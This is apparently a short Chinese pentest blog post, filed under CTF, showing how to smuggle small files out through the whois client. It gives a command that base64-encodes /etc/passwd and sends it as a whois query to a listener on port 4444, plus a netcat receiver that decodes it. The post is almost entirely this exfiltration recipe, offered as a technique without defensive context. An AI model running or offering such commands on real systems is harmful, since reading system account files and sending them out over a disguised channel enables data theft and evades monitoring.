---
layout: post
categories: CTF
title: 利用Whois传输小文件。
date: 2019-09-02 10:03:13 +0800
description: 渗透安全
keywords: whois 渗透
---



```bash
传输机：
root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
接受机：
root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d
```


转载请注明出处，本文采用 [CC4.0](http://creativecommons.org/licenses/by-nc-nd/4.0/) 协议授权